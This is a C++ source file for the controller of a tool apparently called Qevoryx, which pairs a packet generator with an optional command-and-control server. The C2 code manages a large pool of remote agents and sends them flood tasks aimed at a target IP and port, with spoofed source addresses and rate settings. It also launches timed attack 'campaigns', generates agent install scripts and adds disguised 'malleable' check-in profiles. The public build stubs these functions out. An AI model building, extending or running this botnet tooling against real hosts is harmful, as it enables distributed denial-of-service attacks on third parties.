#include "app/application_controller.hpp"

#include "app/application.hpp"
#include "common/network_interfaces.hpp"
#include "config/settings_store.hpp"
#ifdef QEVORYX_ENABLE_C2
#include "server/c2_config.hpp"
#include "server/server.hpp"
#include "c2/protocol.hpp"
#endif

#include <algorithm>
#include <atomic>
#include <chrono>
#include <cstring>
#include <ctime>
#include <deque>
#include <iomanip>
#include <iostream>
#include <memory>
#include <mutex>
#include <sstream>
#include <thread>
#include <utility>
#include <vector>

namespace app {
namespace {

class BackendApplicationController final : public app::ApplicationController {
public:
    explicit BackendApplicationController(config::Config config)
        : config_(std::move(config)) {
        refresh_interfaces();
        select_available_interface(config_);
#ifdef QEVORYX_ENABLE_C2
        // Persisted server settings (port/PSK/safety) survive restarts.
        server_cfg_ = server::ServerConfig::load_or_defaults();
        c2_port_ = server_cfg_.port;
        c2_psk_ = server_cfg_.psk;
        const std::string data_dir = server::ServerConfig::data_dir();
        if (!data_dir.empty()) {
            c2_data_dir_ = data_dir;
        }
#endif
        log(ui::Severity::Info, "Qevoryx started");
    }

    ~BackendApplicationController() override {
        stop();
        c2_stop_server();
    }

    ui::ApplicationSnapshot snapshot() const override {
        const auto interfaces = current_interfaces();

        std::lock_guard<std::mutex> c2lock(c2_mutex_);

        ui::ApplicationSnapshot result;
        result.config = config_;
        result.running = running_.load();
        result.paused = paused_.load();
        result.ready = !running_.load();
        result.generated = app::Application::generated_packets();
        result.errors = app::Application::error_count();
        result.settings_path = config::SettingsStore::settings_path();
        result.interfaces = interfaces;

        {
            std::lock_guard<std::mutex> elock(events_mutex_);
            result.events.assign(events_.begin(), events_.end());
        }

        result.c2.server_running = c2_server_running_;
        result.c2.server_port = c2_port_;
        result.c2.psk = c2_psk_;
        result.c2.agents = c2_agents_snapshot_;
#ifdef QEVORYX_ENABLE_C2
        if (c2_server_ && c2_server_running_) {
            result.c2.pool_active = c2_server_->agent_count();
            result.c2.pool_max = 1000000;
            result.c2.pool_queue = c2_server_->connection_pool_queue();
            result.c2.pool_idle_threads = c2_server_->connection_pool_idle();
            result.c2.campaign_active = c2_server_->campaign_engine().active_count();
            result.c2.malleable_profiles = c2_server_->malleable_store().list_names();
            result.c2.campaign_names.clear();
            for (const auto& c : c2_server_->campaign_engine().list_all()) {
                result.c2.campaign_names.push_back(
                    std::to_string(c.id) + ":" + c.name);
            }
            result.c2.uptime_sec = c2_server_->uptime_sec();
            result.c2.total_connections_accepted = c2_server_->total_connections();
            result.c2.agent_connected = static_cast<std::uint32_t>(c2_server_->agent_count());
            result.c2.agent_busy = static_cast<std::uint32_t>(c2_server_->busy_agent_count());
            result.c2.agent_idle = result.c2.agent_connected - result.c2.agent_busy;
            result.c2.template_count = static_cast<std::uint32_t>(c2_server_->list_templates().size());
            result.c2.template_ids = c2_server_->list_templates();
        }
#endif

        return result;
    }

    void launch(const config::Config& config) override {
        if (runtime_thread_.joinable()) {
            runtime_thread_.join();
        }

        if (running_.exchange(true)) {
            return;
        }

        config::Config launch_config;
        {
            std::lock_guard<std::mutex> lock(events_mutex_);
            config_ = config;
            launch_config = config;
        }
        log(ui::Severity::Info, "Runtime started");

        application_ = std::make_unique<app::Application>(launch_config, false);

        runtime_thread_ = std::thread([this]() {
            std::ostringstream output;
            auto* old_cout = std::cout.rdbuf(output.rdbuf());
            auto* old_cerr = std::cerr.rdbuf(output.rdbuf());

            const int result = application_->run();

            std::cout.rdbuf(old_cout);
            std::cerr.rdbuf(old_cerr);

            running_ = false;
            if (result == 0) {
                log(ui::Severity::Success, "Runtime stopped");
            } else {
                log(ui::Severity::Error, "Runtime failed");
            }

            application_.reset();
            std::lock_guard<std::mutex> lock(events_mutex_);
            paused_ = false;
        });
    }

    void stop() override {
        if (runtime_thread_.joinable()) {
            app::Application::request_stop();
            runtime_thread_.join();
        }
        application_.reset();
        running_ = false;
        paused_ = false;
    }

    void save(const config::Config& config) override {
        {
            std::lock_guard<std::mutex> lock(events_mutex_);
            config_ = config;
        }
        if (config::SettingsStore::save(config)) {
            log(ui::Severity::Success, "Settings saved");
        } else {
            log(ui::Severity::Error, "Failed to save settings");
        }
    }

    void reset() override {
        config::Config defaults = config::SettingsStore::defaults();
        select_available_interface(defaults);
        {
            std::lock_guard<std::mutex> lock(events_mutex_);
            config_ = std::move(defaults);
        }
        log(ui::Severity::Info, "Settings reset");
    }

    void pause() override {
        paused_ = true;
        app::Application::pause();
        log(ui::Severity::Warning, "Runtime paused");
    }

    void resume() override {
        if (running_.load()) {
            app::Application::resume();
            paused_ = false;
            log(ui::Severity::Success, "Runtime resumed");
        } else {
            config::Config config_copy;
            {
                std::lock_guard<std::mutex> lock(events_mutex_);
                config_copy = config_;
            }
            launch(config_copy);
        }
    }

    // ── C2 Server Methods ──

    // ── C2 Server Methods (private C2 sources; stubbed in public builds) ──

#ifdef QEVORYX_ENABLE_C2
    void c2_start_server(std::uint16_t port, const std::string& psk) override {
        std::lock_guard<std::mutex> lock(c2_mutex_);
        if (c2_server_running_) return;

        c2_port_ = port;
        c2_psk_ = psk;
        server_cfg_.port = port;
        server_cfg_.psk = psk;
        server_cfg_.save();  // persist so --serve and next panel boot reuse it
        c2_server_ = std::make_unique<server::C2Server>(server_cfg_);
        if (!c2_data_dir_.empty()) c2_server_->set_data_dir(c2_data_dir_);

        if (!c2_server_->start()) {
            c2_server_.reset();
            std::lock_guard<std::mutex> elock(events_mutex_);
            events_.push_back({timestamp(), ui::Severity::Error,
                               "C2 server failed to start on port " + std::to_string(port)});
            if (events_.size() > 100) events_.pop_front();
            return;
        }

        c2_server_running_ = true;
        c2_recv_thread_ = std::thread([this]() { c2_recv_loop(); });

        std::lock_guard<std::mutex> elock(events_mutex_);
        events_.push_back({timestamp(), ui::Severity::Success,
                           "C2 server started on port " + std::to_string(port)});
        if (events_.size() > 100) events_.pop_front();
    }

    void c2_stop_server() override {
        {
            std::lock_guard<std::mutex> lock(c2_mutex_);
            if (!c2_server_running_) return;
            c2_server_running_ = false;
            if (c2_server_) c2_server_->stop();
        }
        if (c2_recv_thread_.joinable()) c2_recv_thread_.join();
        {
            std::lock_guard<std::mutex> lock(c2_mutex_);
            c2_server_.reset();
            c2_agents_snapshot_.clear();
        }
        std::lock_guard<std::mutex> elock(events_mutex_);
        events_.push_back({timestamp(), ui::Severity::Warning, "C2 server stopped"});
        if (events_.size() > 100) events_.pop_front();
    }

    void c2_broadcast_task(const std::string& target, std::uint16_t port,
                           int mode_index, std::uint32_t workers, std::uint32_t rate,
                           bool spoof) override {
        std::lock_guard<std::mutex> lock(c2_mutex_);
        if (!c2_server_ || !c2_server_running_) return;

        c2::TaskPayload task{};
        std::strncpy(task.target_ip, target.c_str(), sizeof(task.target_ip) - 1);
        task.target_ip[sizeof(task.target_ip) - 1] = '\0';
        task.target_port = port;
        task.packet_mode = static_cast<std::uint8_t>(mode_index < 0 ? 0 : (mode_index % 7));
        task.worker_count = std::min(workers, std::uint32_t{64});
        task.rate_limit = rate;
        task.duration_sec = 0;
        task.payload_min = 64;
        task.payload_max = 1400;
        task.use_spoof_ips = spoof ? 1 : 0;
        task.template_id = 0;

        uint32_t tid = c2_server_->broadcast_task(task);

        std::lock_guard<std::mutex> elock(events_mutex_);
        if (tid == 0) {
            events_.push_back({timestamp(), ui::Severity::Warning,
                               "No idle agents available for task"});
        } else {
            events_.push_back({timestamp(), ui::Severity::Success,
                               "Task " + std::to_string(tid) + " broadcast to idle agents"});
        }
        if (events_.size() > 100) events_.pop_front();
    }

    void c2_send_task_to_agent(const std::string& agent_id, const std::string& target,
                               std::uint16_t port, int mode_index,
                               std::uint32_t workers, std::uint32_t rate,
                               bool spoof) override {
        std::string tid_msg;
        ui::Severity sev = ui::Severity::Success;
        {
            std::lock_guard<std::mutex> lock(c2_mutex_);
            if (!c2_server_ || !c2_server_running_) return;

            c2::TaskPayload task{};
            std::strncpy(task.target_ip, target.c_str(), sizeof(task.target_ip) - 1);
            task.target_ip[sizeof(task.target_ip) - 1] = '\0';
            task.target_port = port;
            task.packet_mode = static_cast<std::uint8_t>(mode_index < 0 ? 0 : (mode_index % 7));
            task.worker_count = std::min(workers, std::uint32_t{64});
            task.rate_limit = rate;
            task.duration_sec = 0;
            task.payload_min = 64;
            task.payload_max = 1400;
            task.use_spoof_ips = spoof ? 1 : 0;
            task.template_id = 0;

            uint32_t tid = c2_server_->assign_task(agent_id, task);
            if (tid == 0) {
                tid_msg = "Agent " + agent_id.substr(0, 8) + " unavailable (busy/offline)";
                sev = ui::Severity::Warning;
            } else {
                tid_msg = "Task " + std::to_string(tid) + " sent to agent " +
                          agent_id.substr(0, 8);
            }
        }
        std::lock_guard<std::mutex> elock(events_mutex_);
        events_.push_back({timestamp(), sev, tid_msg});
        if (events_.size() > 100) events_.pop_front();
    }

    void c2_stop_task(const std::string& agent_id) override {
        std::lock_guard<std::mutex> lock(c2_mutex_);
        if (!c2_server_ || !c2_server_running_) return;
        if (!agent_id.empty()) {
            // Targeted stop: cancel the selected agent's current task if any.
            auto snap = c2_server_->get_agent(agent_id);
            if (snap.current_task_id != 0) {
                c2_server_->stop_task(snap.current_task_id);
            } else {
                c2_server_->stop_all_tasks();
            }
        } else {
            c2_server_->stop_all_tasks();
        }

        std::string msg = agent_id.empty()
            ? "All C2 tasks stopped"
            : "Stop requested for agent " + agent_id.substr(0, 8);
        std::lock_guard<std::mutex> elock(events_mutex_);
        events_.push_back({timestamp(), ui::Severity::Info, msg});
        if (events_.size() > 100) events_.pop_front();
    }

    std::string c2_install_script() const override {
        std::lock_guard<std::mutex> lock(c2_mutex_);
        if (!c2_server_) return "# Start the server first to generate install script";
        return c2_server_->generate_install_script();
    }

    void c2_create_campaign(const std::string& name, const std::string& target,
                            std::uint16_t port, int mode_index,
                            std::uint32_t workers, std::uint32_t rate,
                            std::uint32_t duration_sec) override {
        std::string msg;
        ui::Severity sev = ui::Severity::Success;
        {
            std::lock_guard<std::mutex> lock(c2_mutex_);
            if (!c2_server_ || !c2_server_running_) return;
            server::CampaignStep step;
            step.name = name.empty() ? "step-1" : name;
            step.target_ip = target;
            step.target_port = port;
            step.packet_mode = static_cast<c2::PacketMode>(mode_index < 0 ? 0 : (mode_index % 7));
            step.worker_count = std::min(workers, std::uint32_t{64});
            step.rate_limit = rate;
            step.duration_sec = duration_sec;
            step.payload_min = 64;
            step.payload_max = 1400;
            step.use_spoof_ips = true;
            uint32_t id = c2_server_->campaign_engine().create_campaign(
                name.empty() ? "campaign" : name, {step});
            c2_server_->campaign_engine().start_campaign(id);
            msg = "Campaign " + std::to_string(id) + " started";
        }
        std::lock_guard<std::mutex> elock(events_mutex_);
        events_.push_back({timestamp(), sev, msg});
        if (events_.size() > 100) events_.pop_front();
    }

    void c2_add_malleable(const std::string& name, const std::string& user_agent,
                          const std::string& uri, const std::string& content_type) override {
        std::string msg;
        ui::Severity sev = ui::Severity::Success;
        {
            std::lock_guard<std::mutex> lock(c2_mutex_);
            if (!c2_server_ || !c2_server_running_) return;
            if (name.empty()) return;
            server::MalleableProfile p;
            p.name = name;
            p.user_agent = user_agent.empty() ? "Mozilla/5.0" : user_agent;
            p.post_uri = uri.empty() ? "/api/v1/checkin" : uri;
            p.content_type = content_type.empty() ? "application/octet-stream" : content_type;
            c2_server_->malleable_store().add(std::move(p));
            msg = "Malleable profile '" + name + "' saved";
        }
        std::lock_guard<std::mutex> elock(events_mutex_);
        events_.push_back({timestamp(), sev, msg});
        if (events_.size() > 100) events_.pop_front();
    }
#else
    // Public (open-source) build: C2 engine not included. All C2 calls are
    // safe no-ops so local mode keeps working.
    void c2_start_server(std::uint16_t, const std::string&) override {
        log(ui::Severity::Error, "C2 server not included in this build");
    }
    void c2_stop_server() override {}
    void c2_broadcast_task(const std::string&, std::uint16_t, int, std::uint32_t, std::uint32_t,
                           bool) override {
        log(ui::Severity::Error, "C2 server not included in this build");
    }
    void c2_send_task_to_agent(const std::string&, const std::string&, std::uint16_t, int,
                               std::uint32_t, std::uint32_t, bool) override {
        log(ui::Severity::Error, "C2 server not included in this build");
    }
    void c2_stop_task(const std::string&) override {}
    std::string c2_install_script() const override {
        return "# C2 server not included in this build";
    }
    void c2_create_campaign(const std::string&, const std::string&, std::uint16_t, int,
                            std::uint32_t, std::uint32_t, std::uint32_t) override {
        log(ui::Severity::Error, "C2 server not included in this build");
    }
    void c2_add_malleable(const std::string&, const std::string&, const std::string&,
                          const std::string&) override {
        log(ui::Severity::Error, "C2 server not included in this build");
    }
#endif

private:
    static constexpr auto interface_refresh_interval = std::chrono::seconds(5);

    static std::string timestamp() {
        const auto now = std::chrono::system_clock::now();
        const std::time_t time = std::chrono::system_clock::to_time_t(now);
        std::tm local{};
#ifdef _WIN32
        if (localtime_s(&local, &time) != 0) {
            return {};
        }
#else
        if (localtime_r(&time, &local) == nullptr) {
            return {};
        }
#endif

        std::ostringstream stream;
        stream << std::put_time(&local, "%H:%M:%S");
        return stream.str();
    }

    void log(ui::Severity severity, const std::string& message) {
        std::lock_guard<std::mutex> lock(events_mutex_);
        events_.push_back({timestamp(), severity, message});
        if (events_.size() > 100) {
            events_.pop_front();
        }
    }

    void refresh_interfaces() {
        std::lock_guard<std::mutex> lock(interfaces_mutex_);
        interfaces_ = common::list_network_interfaces();
        interfaces_updated_ = std::chrono::steady_clock::now();
    }

    void select_available_interface(config::Config& config) const {
        const auto interfaces = current_interfaces();
        if (interfaces.empty()) return;

        const bool matches = std::any_of(
            interfaces.begin(), interfaces.end(),
            [&config](const common::NetworkInterface& interface) {
                return interface.name == config.real_ip_interface;
            });
        if (!matches) config.real_ip_interface = interfaces.front().name;
    }

    std::vector<common::NetworkInterface> current_interfaces() const {
        std::lock_guard<std::mutex> lock(interfaces_mutex_);
        const auto now = std::chrono::steady_clock::now();
        if (interfaces_.empty() ||
            now - interfaces_updated_ >= interface_refresh_interval) {
            auto interfaces = common::list_network_interfaces();
            interfaces_ = interfaces;
            interfaces_updated_ = now;
            return interfaces;
        }
        return interfaces_;
    }

    void c2_recv_loop() {
#ifdef QEVORYX_ENABLE_C2
        while (c2_server_running_) {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            if (!c2_server_running_) break;

            std::vector<server::AgentSnapshot> agents;
            {
                std::lock_guard<std::mutex> lock(c2_mutex_);
                if (!c2_server_ || !c2_server_running_) break;
                agents = c2_server_->list_agents();
            }

            std::vector<ui::AgentSnapshot> new_snap;
            new_snap.reserve(agents.size());
            for (const auto& a : agents) {
                ui::AgentSnapshot snap;
                snap.id = a.id;
                snap.hostname = a.hostname;
                switch (a.os) {
                    case c2::AgentOS::LINUX:   snap.os = "Linux"; break;
                    case c2::AgentOS::WINDOWS: snap.os = "Windows"; break;
                    case c2::AgentOS::MACOS:   snap.os = "macOS"; break;
                    default: snap.os = "Unknown"; break;
                }
                switch (a.status) {
                    case c2::AgentStatus::IDLE:  snap.status = "Idle"; snap.idle = true; break;
                    case c2::AgentStatus::BUSY:  snap.status = "Busy"; snap.idle = false; break;
                    default: snap.status = "Connected"; snap.idle = false; break;
                }
                snap.packets_sent = a.packets_sent;
                snap.cpu_usage = a.cpu_usage;
                snap.memory_usage = a.memory_usage;
                snap.uptime_sec = a.uptime_sec;
                new_snap.push_back(std::move(snap));
            }
            {
                std::lock_guard<std::mutex> lock(c2_mutex_);
                c2_agents_snapshot_ = std::move(new_snap);
            }
        }
#else
        (void)0;
#endif
    }

    config::Config config_;
    std::unique_ptr<app::Application> application_;
    std::thread runtime_thread_;
    std::atomic<bool> running_{false};
    std::atomic<bool> paused_{false};
    mutable std::mutex events_mutex_;
    std::deque<ui::UiEventLogEntry> events_;
    mutable std::mutex interfaces_mutex_;
    mutable std::vector<common::NetworkInterface> interfaces_;
    mutable std::chrono::steady_clock::time_point interfaces_updated_{};

    mutable std::mutex c2_mutex_;
#ifdef QEVORYX_ENABLE_C2
    std::unique_ptr<server::C2Server> c2_server_;
    std::thread c2_recv_thread_;
    server::ServerConfig server_cfg_;
    std::string c2_data_dir_;
#endif
    bool c2_server_running_{false};
    std::uint16_t c2_port_{7777};
    std::string c2_psk_;
    std::vector<ui::AgentSnapshot> c2_agents_snapshot_;
};

} // namespace

std::unique_ptr<ApplicationController> create_application_controller(config::Config config) {
    return std::make_unique<BackendApplicationController>(std::move(config));
}

} // namespace app
